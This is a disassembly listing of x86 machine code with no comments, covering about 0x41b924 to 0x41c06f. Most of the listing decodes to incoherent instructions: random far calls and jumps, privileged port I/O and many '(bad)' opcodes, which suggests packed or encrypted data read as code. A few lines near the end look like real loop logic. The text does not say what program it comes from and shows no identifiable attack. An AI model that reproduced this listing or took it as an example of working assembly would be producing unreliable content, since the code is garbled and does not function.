  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx+0x7de62136]
  41b92f:	mov    esi,0x7fe6f0b6
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b96e
  41b93a:	das    
  41b93b:	(bad)  
  41b93c:	fimul  WORD PTR [edi+edi*4-0x79]
  41b940:	sub    eax,0x83a2746b
  41b945:	mov    edi,0x8e5afb8e
  41b94a:	scas   eax,DWORD PTR es:[edi]
  41b94b:	shl    BYTE PTR [edi*2-0x2399ae91],0x5e
  41b953:	add    ebp,DWORD PTR [eax+esi*8-0x3e1903a]
  41b95a:	jge    0x41b925
  41b95c:	jecxz  0x41b8e7
  41b95e:	dec    eax
  41b95f:	push   ebp
  41b960:	mov    eax,DWORD PTR [edx-0xc]
  41b963:	call   0xf6161bff
  41b968:	js     0x41b90d
  41b96a:	adc    BYTE PTR [ebp-0x73],bl
  41b96d:	shl    BYTE PTR [edi],1
  41b96f:	inc    ebp
  41b970:	cmp    BYTE PTR [ebx+eax*4],bh
  41b973:	push   ecx
  41b974:	pop    edi
  41b975:	pop    es
  41b976:	hlt    
  41b977:	adc    DWORD PTR [ebx+0x37],esp
  41b97a:	mov    ds:0x61d1eb3d,al
  41b97f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b980:	dec    eax
  41b981:	mov    esp,0xf25bfa40
  41b986:	ins    BYTE PTR es:[edi],dx
  41b987:	cmp    eax,0xe094d103
  41b98c:	mov    bh,0xdd
  41b98e:	mov    ebp,0x6e527341
  41b993:	lods   al,BYTE PTR ds:[esi]
  41b994:	add    al,0x54
  41b996:	stos   DWORD PTR es:[edi],eax
  41b997:	push   ss
  41b998:	stos   BYTE PTR es:[edi],al
  41b999:	fdiv   st(1),st
  41b99b:	jno    0x41b9e1
  41b99d:	xor    eax,0xd254a38
  41b9a2:	jns    0x41b9c4
  41b9a4:	je     0x41ba0b
  41b9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9a7:	sub    ecx,ebp
  41b9a9:	(bad)  
  41b9ab:	inc    eax
  41b9ac:	rcr    BYTE PTR [eax+0x1c],cl
  41b9af:	and    dh,dl
  41b9b1:	push   eax
  41b9b2:	sbb    DWORD PTR [ecx+0x5ff817c1],edx
  41b9b8:	imul   dl
  41b9ba:	shl    ah,0xf0
  41b9bd:	jp     0x41b9b8
  41b9bf:	in     al,dx
  41b9c0:	adc    BYTE PTR [edi+0x41],cl
  41b9c3:	push   edi
  41b9c4:	cmp    BYTE PTR [esi-0x3220b3e0],dh
  41b9ca:	sub    eax,0x194bda68
  41b9cf:	sbb    BYTE PTR [edx+0x7],al
  41b9d2:	push   edi
  41b9d3:	shl    DWORD PTR [edx+0x53a63ebe],cl
  41b9d9:	push   ebx
  41b9da:	shr    BYTE PTR [eax+0x3a0479ad],cl
  41b9e0:	test   al,0xb4
  41b9e2:	push   ds
  41b9e3:	inc    edx
  41b9e4:	rcl    BYTE PTR [ebp-0x2f04aa21],0xa8
  41b9eb:	outs   dx,DWORD PTR ds:[esi]
  41b9ec:	mov    ebx,0xd82c5dc2
  41b9f1:	ror    DWORD PTR [edi+0x5a28157c],1
  41b9f7:	fdiv   st(6),st
  41b9f9:	cmp    esi,DWORD PTR [ecx+0x34]
  41b9fc:	stc    
  41b9fd:	mov    BYTE PTR [edx],ch
  41b9ff:	mov    ch,0x7c
  41ba01:	lods   eax,DWORD PTR ds:[esi]
  41ba02:	stc    
  41ba03:	div    ah
  41ba05:	jmp    0x7f9c3e97
  41ba0a:	pushf  
  41ba0b:	xchg   dh,dl
  41ba0d:	adc    ch,cl
  41ba0f:	xchg   DWORD PTR [edi+0x70],edi
  41ba12:	adc    BYTE PTR [esi],dl
  41ba14:	fs and al,0xaf
  41ba17:	jmp    0xd170:0x7e5bc3e0
  41ba1e:	and    cl,dl
  41ba20:	fsub   QWORD PTR [ecx]
  41ba22:	jle    0x41ba3d
  41ba24:	cdq    
  41ba25:	mov    esp,0xdb0be7cd
  41ba2a:	xor    dh,BYTE PTR [edx]
  41ba2c:	pop    esp
  41ba2d:	fimul  DWORD PTR [edx-0x67cf8017]
  41ba33:	mov    ecx,0xe6888f7a
  41ba38:	pop    ebx
  41ba39:	sar    DWORD PTR [ebp+0x4f7f9e01],1
  41ba3f:	clc    
  41ba40:	xor    al,0x78
  41ba42:	xchg   edi,ebp
  41ba44:	jmp    DWORD PTR [ebx]
  41ba46:	push   ebp
  41ba47:	das    
  41ba48:	or     dl,BYTE PTR [edx-0x7ce293db]
  41ba4e:	call   0x57573867
  41ba53:	aam    0x57
  41ba55:	ret    
  41ba56:	pusha  
  41ba57:	stos   BYTE PTR es:[edi],al
  41ba58:	inc    esi
  41ba59:	cmp    edx,ebp
  41ba5b:	pop    ss
  41ba5c:	mov    bl,BYTE PTR [ecx-0x622d00c2]
  41ba62:	sub    al,0x27
  41ba64:	add    DWORD PTR [esi+0x2a5c7aae],edx
  41ba6a:	test   BYTE PTR [ebx],al
  41ba6c:	dec    eax
  41ba6d:	mov    dl,0x29
  41ba6f:	add    bh,BYTE PTR [ebp+0x3927f883]
  41ba75:	or     bl,BYTE PTR [eax]
  41ba77:	mov    cl,0xe8
  41ba79:	push   ebp
  41ba7a:	mov    ss,WORD PTR [esi]
  41ba7c:	lods   eax,DWORD PTR ds:[esi]
  41ba7d:	lea    esp,[ebx+0x5640cc9f]
  41ba83:	or     BYTE PTR [edx+0x6f],0x79
  41ba87:	scas   al,BYTE PTR es:[edi]
  41ba88:	mov    esp,0xe59bdb8e
  41ba8d:	loope  0x41ba65
  41ba8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba90:	or     ecx,esp
  41ba92:	jp     0x41baaa
  41ba94:	not    DWORD PTR [edi]
  41ba96:	xor    BYTE PTR [esi+0x7],ch
  41ba99:	(bad)  
  41ba9b:	xor    al,0x1c
  41ba9d:	cmp    eax,0xdce3284f
  41baa2:	mov    dl,0xd6
  41baa4:	(bad)  
  41baa5:	push   ds
  41baa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baa7:	add    DWORD PTR ds:0xfc97fb84,edi
  41baad:	enter  0xd683,0x11
  41bab1:	xchg   esi,eax
  41bab2:	xchg   cl,ch
  41bab4:	repz xor bh,BYTE PTR [ebp-0x5a33c10b]
  41babb:	fidiv  DWORD PTR [edi*2-0x5f64e7a0]
  41bac2:	add    DWORD PTR [eax],edi
  41bac4:	sub    al,0x5f
  41bac6:	daa    
  41bac7:	dec    ecx
  41bac8:	outs   dx,BYTE PTR ds:[esi]
  41bac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baca:	dec    edx
  41bacb:	xor    DWORD PTR [edi],ebp
  41bacd:	inc    ecx
  41bace:	retf   0x9727
  41bad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bad2:	retf   0xcb16
  41bad5:	xchg   edx,esp
  41bad7:	xchg   ecx,eax
  41bad8:	pop    ds
  41bad9:	pop    edx
  41bada:	test   al,dl
  41badc:	add    BYTE PTR [ebx],0xe7
  41badf:	adc    al,0xbd
  41bae1:	in     al,0xe6
  41bae3:	jle    0x41ba77
  41bae5:	inc    esi
  41bae6:	cmp    eax,DWORD PTR es:[ecx]
  41bae9:	or     DWORD PTR [ecx],ecx
  41baeb:	add    ah,BYTE PTR [esi+0x39]
  41baee:	test   BYTE PTR [ecx-0x368ce879],dl
  41baf4:	push   ecx
  41baf5:	scas   eax,DWORD PTR es:[edi]
  41baf6:	jp     0x41bb47
  41baf8:	jne    0x41bb58
  41bafa:	push   edi
  41bafb:	push   eax
  41bafc:	or     BYTE PTR [edx+0x6e],bl
  41baff:	xor    edx,DWORD PTR ds:0x7a65cc75
  41bb05:	rcl    edx,1
  41bb07:	lahf   
  41bb08:	iret   
  41bb09:	pop    eax
  41bb0a:	mov    dh,0x53
  41bb0c:	addr16 inc edx
  41bb0e:	leave  
  41bb0f:	and    al,0xd5
  41bb11:	mov    dh,0xa9
  41bb13:	mov    al,0xbc
  41bb15:	xchg   ebx,eax
  41bb16:	clc    
  41bb17:	and    eax,0x442b497
  41bb1c:	add    BYTE PTR [ecx],ch
  41bb1e:	jns    0x41bb00
  41bb20:	add    eax,esi
  41bb22:	sbb    eax,0xb7ed8347
  41bb27:	loop   0x41bace
  41bb29:	outs   dx,BYTE PTR ds:[esi]
  41bb2a:	xor    al,0xb4
  41bb2c:	push   edx
  41bb2d:	and    eax,0x85b04d32
  41bb32:	inc    esp
  41bb33:	rol    bl,1
  41bb35:	pop    ecx
  41bb36:	mov    al,0x6a
  41bb38:	js     0x41bb82
  41bb3a:	gs pop eax
  41bb3c:	pop    es
  41bb3d:	sub    ah,ah
  41bb3f:	jo     0x41bbb9
  41bb41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb42:	les    edx,FWORD PTR [esp+eax*2+0x6b09f3d1]
  41bb49:	xor    BYTE PTR [edi-0x4c792b17],dl
  41bb4f:	pop    eax
  41bb50:	mov    DWORD PTR [ebx],esi
  41bb52:	shr    ecx,1
  41bb54:	xor    BYTE PTR [edx],al
  41bb56:	add    BYTE PTR [eax],al
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0xb617bf12
  41bb65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb66:	jecxz  0x41bbda
  41bb68:	mov    ah,ah
  41bb6a:	jg     0x41bbe4
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41bb5d
  41bb71:	pop    ds
  41bb72:	pop    edi
  41bb73:	mov    dh,0x36
  41bb75:	and    al,0x66
  41bb77:	aaa    
  41bb78:	ss push ss
  41bb7a:	or     DWORD PTR [ebx+ecx*2],esp
  41bb7d:	aas    
  41bb7e:	out    dx,eax
  41bb7f:	push   eax
  41bb80:	sbb    al,BYTE PTR [ecx+ebp*1-0x6f29ef46]
  41bb87:	cli    
  41bb88:	enter  0x9622,0x2f
  41bb8c:	inc    edi
  41bb8d:	dec    esp
  41bb8e:	mov    eax,ds
  41bb90:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41bb92:	dec    esi
  41bb93:	and    cl,BYTE PTR [edx]
  41bb95:	aad    0xe7
  41bb97:	mov    edi,0x1d2871
  41bb9c:	call   0xc427:0xcaa53402
  41bba3:	add    eax,0xce59ba7f
  41bba8:	retf   
  41bba9:	int    0x2b
  41bbab:	fist   DWORD PTR [esi+0x2c]
  41bbae:	xchg   edx,eax
  41bbaf:	dec    edx
  41bbb0:	lods   eax,DWORD PTR ds:[esi]
  41bbb1:	leave  
  41bbb2:	in     al,0xbb
  41bbb4:	dec    edi
  41bbb5:	fsubrp st(6),st
  41bbb7:	or     eax,0x61e10e0c
  41bbbc:	mov    ecx,0x26450df5
  41bbc1:	fs push eax
  41bbc3:	test   BYTE PTR [eax+ebx*8],ch
  41bbc6:	xchg   ebp,eax
  41bbc7:	ds push esp
  41bbc9:	sub    al,cl
  41bbcb:	dec    esp
  41bbcc:	push   edx
  41bbcd:	sti    
  41bbce:	imul   ebx,DWORD PTR [ebx+0x66],0xffffffe8
  41bbd2:	fwait
  41bbd3:	scas   al,BYTE PTR es:[edi]
  41bbd4:	push   edi
  41bbd5:	xor    BYTE PTR [eax+0x43],bh
  41bbd8:	push   eax
  41bbd9:	fistp  QWORD PTR [ebx+0x3d0e9c25]
  41bbdf:	sbb    DWORD PTR [edi+0x15],0xfa1d3853
  41bbe6:	push   ecx
  41bbe7:	mov    ebx,0x848f656a
  41bbec:	clc    
  41bbed:	xchg   DWORD PTR [ebx],ecx
  41bbef:	mov    dl,BYTE PTR [ebx]
  41bbf1:	and    DWORD PTR [ecx],0xffffffab
  41bbf4:	or     BYTE PTR [ebx],cl
  41bbf6:	pushf  
  41bbf7:	div    dh
  41bbf9:	inc    esi
  41bbfa:	je     0x41bc13
  41bbfc:	jb     0x41bbf5
  41bbfe:	xor    BYTE PTR [edx-0x6a1efdf8],bl
  41bc04:	cdq    
  41bc05:	ret    0xf3a5
  41bc08:	add    cl,BYTE PTR [ecx]
  41bc0a:	xchg   esi,eax
  41bc0b:	shl    DWORD PTR [edi-0x7c0312e5],1
  41bc11:	ss push es
  41bc13:	pop    esp
  41bc14:	sbb    al,0x3e
  41bc16:	add    al,0x68
  41bc18:	cmp    eax,0x17547ed5
  41bc1d:	push   ds
  41bc1e:	xchg   DWORD PTR [ecx+0x48deff94],esp
  41bc24:	xlat   BYTE PTR ds:[ebx]
  41bc25:	adc    DWORD PTR es:[ebp+0x12],0xc8c99745
  41bc2d:	pop    es
  41bc2e:	mov    fs,WORD PTR [esi+0x6ad280d6]
  41bc34:	imul   ax,WORD PTR [eax],0xdb30
  41bc39:	xlat   BYTE PTR ds:[ebx]
  41bc3a:	(bad)  
  41bc3b:	mov    WORD PTR [edi],cs
  41bc3d:	push   eax
  41bc3e:	shl    DWORD PTR [ecx-0x562dd605],1
  41bc44:	pop    ds
  41bc45:	stos   BYTE PTR es:[edi],al
  41bc46:	mov    dh,0xde
  41bc48:	mov    edi,0x4959da14
  41bc4d:	enter  0xee4b,0x45
  41bc51:	test   cl,ch
  41bc53:	sbb    al,BYTE PTR [edx-0x1cc7747c]
  41bc59:	icebp  
  41bc5a:	jbe    0x41bc44
  41bc5c:	(bad)  
  41bc5d:	mov    ecx,0xa4845586
  41bc62:	and    BYTE PTR [edi],0x4f
  41bc65:	mov    al,0xa9
  41bc67:	mov    ds:0xd9bfe46,eax
  41bc6c:	adc    ebx,DWORD PTR [edi-0x1a]
  41bc6f:	inc    esp
  41bc70:	push   ebp
  41bc71:	out    dx,al
  41bc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc73:	sar    BYTE PTR [ecx-0xb],0x30
  41bc77:	cdq    
  41bc78:	dec    esi
  41bc79:	jae    0x41bc02
  41bc7b:	xchg   esp,eax
  41bc7c:	dec    ebp
  41bc7d:	cmc    
  41bc7e:	aam    0xd4
  41bc80:	push   esp
  41bc81:	js     0x41bc7b
  41bc83:	sbb    al,0x31
  41bc85:	pop    ss
  41bc86:	add    eax,0xd1c88dff
  41bc8b:	bound  edi,QWORD PTR [eax]
  41bc8d:	push   edi
  41bc8e:	ins    DWORD PTR es:[edi],dx
  41bc8f:	mov    ah,ch
  41bc91:	add    eax,0xd0c7f709
  41bc96:	dec    esi
  41bc97:	fisttp DWORD PTR [ecx+0x16436bd6]
  41bc9d:	gs out 0xc,eax
  41bca0:	mov    edx,0x744df03
  41bca5:	pop    ecx
  41bca6:	fs add eax,0x8cb053a3
  41bcac:	xlat   BYTE PTR ds:[ebx]
  41bcad:	and    DWORD PTR ss:[edx],0x51
  41bcb1:	lock inc ebp
  41bcb3:	bound  edx,QWORD PTR [ebx+0x17]
  41bcb6:	pop    ecx
  41bcb7:	and    al,0x62
  41bcb9:	test   al,0x9c
  41bcbb:	push   edi
  41bcbc:	ins    BYTE PTR es:[edi],dx
  41bcbd:	pop    ds
  41bcbe:	mul    DWORD PTR [ecx-0x5c031c0d]
  41bcc4:	push   ds
  41bcc5:	fistp  WORD PTR [ebx-0x69]
  41bcc8:	and    al,0x49
  41bcca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bccb:	mov    ds:0xcce809fc,al
  41bcd0:	test   eax,0xec410cf
  41bcd5:	mov    ebp,0xc4d8e1fc
  41bcda:	push   0x75959ea1
  41bcdf:	and    dh,0x75
  41bce2:	cmp    BYTE PTR [edx+0x52c128bb],cl
  41bce8:	mov    BYTE PTR [edi-0x68],ah
  41bceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcec:	jo     0x41bcb4
  41bcee:	xchg   BYTE PTR [esi-0xc],dl
  41bcf1:	sub    DWORD PTR [edx+0x56b0333a],ebx
  41bcf7:	push   es
  41bcf8:	inc    ecx
  41bcf9:	xchg   esi,eax
  41bcfa:	push   esi
  41bcfb:	test   al,0xab
  41bcfd:	dec    ebp
  41bcfe:	mov    esi,0x9ec83b4e
  41bd03:	imul   ebx,DWORD PTR [edi+0x75],0x2c414174
  41bd0a:	call   0xe2524e48
  41bd0f:	cdq    
  41bd10:	pushf  
  41bd11:	in     eax,dx
  41bd12:	and    al,0x5b
  41bd14:	aaa    
  41bd15:	dec    ebp
  41bd16:	sbb    al,0x3
  41bd18:	dec    ecx
  41bd19:	lahf   
  41bd1a:	cmp    eax,0x2947c5f7
  41bd1f:	cmc    
  41bd20:	neg    DWORD PTR [ebx]
  41bd22:	sbb    eax,0x947b887b
  41bd27:	in     eax,dx
  41bd28:	lock pushf 
  41bd2a:	push   0x77113c5f
  41bd2f:	jl     0x41bd51
  41bd31:	ins    DWORD PTR es:[edi],dx
  41bd32:	pop    edx
  41bd33:	xor    al,al
  41bd35:	ror    DWORD PTR [edi+eiz*1-0x3f],0x61
  41bd3a:	ss stos BYTE PTR es:[edi],al
  41bd3c:	push   edx
  41bd3d:	sub    al,0xb2
  41bd3f:	int    0x9e
  41bd41:	or     DWORD PTR [esi*4+0x43f61357],edx
  41bd48:	sti    
  41bd49:	jecxz  0x41bd14
  41bd4b:	into   
  41bd4c:	mov    ebx,0x3adf0e23
  41bd51:	pop    ebx
  41bd52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd53:	cli    
  41bd54:	push   0x62
  41bd56:	iret   
  41bd57:	mov    al,0x69
  41bd59:	(bad)  
  41bd5b:	jmp    0xe12b91cf
  41bd60:	enter  0xd6ed,0x13
  41bd64:	sub    BYTE PTR ds:0xe9b51ec5,cl
  41bd6a:	push   0x4c162e84
  41bd6f:	mov    esi,0x30a3278d
  41bd74:	mov    ch,0x34
  41bd76:	or     eax,esp
  41bd78:	mov    WORD PTR [eax+0x10],gs
  41bd7b:	rol    BYTE PTR [ebp+0x6c19ddb2],0x6b
  41bd82:	push   ss
  41bd83:	lahf   
  41bd84:	mov    DWORD PTR [esi-0x80],eax
  41bd87:	push   ecx
  41bd88:	mov    ecx,DWORD PTR [ebp+0x8]
  41bd8b:	jmp    0x41bfc0
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0xffffffa1
  41bd9d:	sti    
  41bd9e:	or     DWORD PTR [ebp-0x60],esi
  41bda1:	jmp    0x7878:0x7e10787f
  41bda8:	nop
  41bda9:	jo     0x41bdcb
  41bdab:	ins    BYTE PTR es:[edi],dx
  41bdac:	leave  
  41bdad:	lods   al,BYTE PTR ds:[esi]
  41bdae:	int    0x5f
  41bdb0:	fwait
  41bdb1:	aam    0x52
  41bdb3:	adc    DWORD PTR [eax],esp
  41bdb5:	cmc    
  41bdb6:	adc    BYTE PTR [ebx],dh
  41bdb8:	(bad)  
  41bdb9:	aad    0x5e
  41bdbb:	dec    ebx
  41bdbc:	hlt    
  41bdbd:	jne    0x41bd8f
  41bdbf:	(bad)  
  41bdc0:	out    0xda,al
  41bdc2:	pop    ebp
  41bdc3:	or     DWORD PTR [edi+0x663d242b],0xffffffcb
  41bdca:	call   0xa75:0xca4b71d7
  41bdd1:	push   edi
  41bdd2:	repnz std 
  41bdd4:	xlat   BYTE PTR ds:[ebx]
  41bdd5:	fsubr  QWORD PTR [ecx-0x69376cae]
  41bddb:	loop   0x41bd94
  41bddd:	adc    eax,eax
  41bddf:	dec    esp
  41bde0:	enter  0xdc4b,0xae
  41bde4:	mov    ch,0xf6
  41bde6:	mov    bl,0x5
  41bde8:	and    DWORD PTR [ebp-0x7b309945],esp
  41bdee:	mov    ch,bl
  41bdf0:	pop    ebx
  41bdf1:	dec    esp
  41bdf2:	call   0x62a0:0x7ba122b1
  41bdf9:	sti    
  41bdfa:	push   ebp
  41bdfb:	cdq    
  41bdfc:	mov    bl,al
  41bdfe:	out    dx,eax
  41bdff:	enter  0xcd47,0x95
  41be03:	dec    ebp
  41be04:	call   FWORD PTR [ecx]
  41be06:	mov    cs,WORD PTR [ebp+0x34]
  41be09:	out    dx,eax
  41be0a:	inc    esi
  41be0b:	jge    0x41be03
  41be0d:	sbb    dh,bl
  41be0f:	push   esp
  41be10:	fbld   TBYTE PTR [edi]
  41be12:	pop    edx
  41be13:	fs xchg ecx,eax
  41be15:	aas    
  41be16:	push   eax
  41be17:	push   eax
  41be18:	shl    bl,1
  41be1a:	int3   
  41be1b:	into   
  41be1c:	lods   eax,DWORD PTR ds:[esi]
  41be1d:	push   ss
  41be1e:	ret    0xa37d
  41be21:	and    al,0xb7
  41be23:	xchg   ebx,eax
  41be24:	fisubr WORD PTR [ebx-0x6a]
  41be27:	xchg   esi,eax
  41be28:	in     al,0xca
  41be2a:	inc    ecx
  41be2b:	pusha  
  41be2c:	fs xor eax,ebx
  41be2f:	sub    edi,eax
  41be31:	sar    esi,0x13
  41be34:	pop    ss
  41be35:	std    
  41be36:	out    0xee,al
  41be38:	or     BYTE PTR ds:0xc42d41e0,al
  41be3e:	mov    bh,0xc8
  41be40:	xor    BYTE PTR [ecx+edi*8-0x80],0x7a
  41be45:	mov    esi,0x3b9f37b6
  41be4a:	push   ecx
  41be4b:	jecxz  0x41bdf6
  41be4d:	lahf   
  41be4e:	rcr    ebp,cl
  41be50:	adc    ch,BYTE PTR [ebp+0x1352dd1f]
  41be56:	sbb    BYTE PTR [edi+ecx*4-0x60],bh
  41be5a:	(bad)  
  41be5b:	(bad)  [ebx]
  41be5d:	inc    esi
  41be5e:	pop    ds
  41be5f:	sub    ecx,esp
  41be61:	xchg   ecx,eax
  41be62:	ja     0x41bea1
  41be64:	icebp  
  41be65:	jns    0x41be82
  41be67:	repz test DWORD PTR [ecx+eiz*2+0x75],ebx
  41be6c:	ins    BYTE PTR es:[edi],dx
  41be6d:	and    eax,0x935c1787
  41be72:	dec    esp
  41be73:	enter  0x363f,0x74
  41be77:	nop
  41be78:	push   0x3fc133c4
  41be7d:	mov    esi,0x39bf01b6
  41be82:	test   cl,bl
  41be84:	sbb    esp,DWORD PTR [ebx+0x24]
  41be87:	and    BYTE PTR [ebp+eax*8-0xe],dl
  41be8b:	std    
  41be8c:	mov    esp,0xad302fdb
  41be91:	addr16 dec edi
  41be93:	adc    esi,ecx
  41be95:	aaa    
  41be96:	xor    eax,0x867b19fc
  41be9b:	fcmovnbe st,st(5)
  41be9d:	arpl   WORD PTR [ebx+0x58134acc],si
  41bea3:	and    DWORD PTR [edi+esi*2+0x31],edx
  41bea7:	idiv   DWORD PTR [edi+0x9]
  41beaa:	push   esi
  41beab:	adc    BYTE PTR [esp+eiz*8+0xf],al
  41beaf:	xchg   ebp,eax
  41beb0:	fadd   DWORD PTR [ecx+0x27]
  41beb3:	inc    edi
  41beb4:	push   cs
  41beb5:	inc    eax
  41beb6:	popf   
  41beb7:	lahf   
  41beb8:	mov    BYTE PTR [eax+0x40],bl
  41bebb:	push   ds
  41bebc:	mov    bl,0x5a
  41bebe:	stos   BYTE PTR es:[edi],al
  41bebf:	jmp    0xbc3d:0x2f34ee87
  41bec6:	push   0x37
  41bec8:	push   ds
  41bec9:	pop    ecx
  41beca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41becb:	add    al,BYTE PTR [eax]
  41becd:	jnp    0x41be7d
  41becf:	jne    0x41bed3
  41bed1:	stc    
  41bed2:	inc    edx
  41bed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bed4:	jno    0x41bf2f
  41bed6:	cmp    BYTE PTR [esi+0x48],al
  41bed9:	pop    ebp
  41beda:	xchg   edx,eax
  41bedb:	cmp    BYTE PTR [edx+0x18],dh
  41bede:	push   0xffffffb3
  41bee0:	f2xm1  
  41bee2:	pushf  
  41bee3:	das    
  41bee4:	dec    eax
  41bee5:	sahf   
  41bee6:	xchg   edi,eax
  41bee7:	lods   al,BYTE PTR ds:[esi]
  41bee8:	sahf   
  41bee9:	psllq  mm0,QWORD PTR [esi-0x40]
  41beed:	das    
  41beee:	mov    edi,0x524ab505
  41bef3:	popa   
  41bef4:	xchg   esi,eax
  41bef5:	adc    DWORD PTR [edx+0x71132078],esp
  41befb:	sub    dh,dh
  41befd:	mov    ebx,0xa80e83c3
  41bf02:	pop    ecx
  41bf03:	fs mov bh,0xff
  41bf06:	pop    ecx
  41bf07:	mov    esi,0xfbfdf3fb
  41bf0c:	rcr    eax,1
  41bf0e:	enter  0x974a,0xf2
  41bf12:	dec    esp
  41bf13:	push   ebp
  41bf14:	call   0x7870:0xcc4c0fc8
  41bf1b:	popa   
  41bf1c:	imul   esp,DWORD PTR [ebx+0x72b1a15d],0xffffff9d
  41bf23:	mul    BYTE PTR [ebx+0x2]
  41bf26:	mov    ah,0xe5
  41bf28:	adc    al,al
  41bf2a:	jo     0x41beda
  41bf2c:	ja     0x41bf73
  41bf2e:	adc    BYTE PTR [eax+0x1d],bh
  41bf31:	cld    
  41bf32:	push   0x89a6d365
  41bf37:	dec    ecx
  41bf38:	les    edx,FWORD PTR [ecx+ebx*2-0x74109b60]
  41bf3f:	mov    ds:0xaefa31e8,al
  41bf44:	fild   WORD PTR [edx+0x25]
  41bf47:	pop    ebx
  41bf48:	push   esi
  41bf49:	aad    0x44
  41bf4b:	or     eax,0xcdde3e56
  41bf50:	mov    edi,0x202491e5
  41bf55:	(bad)  
  41bf56:	sbb    ebp,DWORD PTR [edi-0x24]
  41bf59:	xchg   ebx,eax
  41bf5a:	and    eax,DWORD PTR [eax]
  41bf5c:	ss clc 
  41bf5e:	lods   al,BYTE PTR ds:[esi]
  41bf5f:	pop    es
  41bf60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf61:	das    
  41bf62:	ja     0x41bf75
  41bf64:	push   eax
  41bf65:	cmp    al,dh
  41bf67:	pop    esi
  41bf68:	jae    0x41bf7f
  41bf6a:	adc    ah,BYTE PTR [edx]
  41bf6c:	(bad)  
  41bf6d:	mov    esp,0x5a84804
  41bf72:	retf   0xe567
  41bf75:	shl    BYTE PTR [ecx-0x6fc4451],1
  41bf7b:	jecxz  0x41bfe5
  41bf7d:	fs jg  0x41bfcc
  41bf80:	xchg   BYTE PTR [eax+eiz*4-0x733f7b6f],ah
  41bf87:	rol    DWORD PTR [eax+0x39],cl
  41bf8a:	jecxz  0x41bf4d
  41bf8c:	mov    ebx,0xdddf1e63
  41bf91:	test   eax,0x851db78d
  41bf96:	not    dh
  41bf98:	out    dx,al
  41bf99:	jb     0x759e8d20
  41bf9f:	inc    edx
  41bfa0:	call   0x4936:0x21737a1c
  41bfa7:	push   esi
  41bfa8:	sub    bh,BYTE PTR [ebx-0x7fda4e07]
  41bfae:	mov    edi,0x9e3fd0a0
  41bfb3:	les    ebp,FWORD PTR [esi+0x3c]
  41bfb6:	das    
  41bfb7:	in     al,dx
  41bfb8:	jno    0x41bf4b
  41bfba:	sbb    eax,0x34b999ce
  41bfbf:	outs   dx,DWORD PTR ds:[esi]
  41bfc0:	lea    ecx,[edx+ecx*1+0x327298]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	cmp    bl,dl
  41bff1:	sbb    al,0x28
  41bff3:	mov    eax,0x10787fe8
  41bff8:	jle    0x41c072
  41bffa:	js     0x41c012
  41bffc:	push   ebx
  41bffd:	mov    eax,ds:0x5951e56a
  41c002:	mov    dh,bl
  41c004:	and    al,0x2
  41c006:	ret    0x6bd5
  41c009:	lds    edi,FWORD PTR [ecx]
  41c00b:	(bad)  
  41c00c:	aam    0xf9
  41c00e:	popa   
  41c00f:	fwait
  41c010:	pop    ss
  41c011:	xchg   ecx,eax
  41c012:	sbb    BYTE PTR fs:[ebx-0x45],al
  41c016:	jne    0x41c07f
  41c018:	imul   esi,DWORD PTR ds:0x68a9cf47,0x1c499ae7
  41c022:	inc    edx
  41c023:	ss push ebp
  41c025:	jno    0x41bfeb
  41c027:	in     al,0x3f
  41c029:	cdq    
  41c02a:	mov    al,ds:0x1eb48c42
  41c02f:	clc    
  41c030:	into   
  41c031:	in     al,dx
  41c032:	xchg   edx,eax
  41c033:	and    dh,al
  41c035:	jae    0x41bfc1
  41c037:	neg    edi
  41c039:	cmc    
  41c03a:	test   eax,0xf7514014
  41c03f:	out    0x94,al
  41c041:	pushf  
  41c042:	scas   eax,DWORD PTR es:[edi]
  41c043:	xchg   edi,eax
  41c044:	xchg   esi,eax
  41c045:	mov    DWORD PTR [esi-0x4083f0c6],eax
  41c04b:	jl     0x41c0c2
  41c04d:	mov    al,ds:0xd7f59de8
  41c052:	xlat   BYTE PTR ds:[ebx]
  41c053:	out    0x61,eax
  41c055:	inc    esp
  41c056:	loope  0x41bfdd
  41c058:	mov    fs,WORD PTR [ebp-0x3b]
  41c05b:	into   
  41c05c:	imul   edx,DWORD PTR [eax+0x40],0xf6b2bc8d
  41c063:	js     0x41c00e
  41c065:	and    esi,DWORD PTR [ebp+0x41]
  41c068:	xchg   edx,eax
  41c069:	jns    0x41c0db
  41c06b:	jb     0x41c0dd
  41c06d:	adc    ecx,ebp
  41c06f:	jge    0x41c0c4
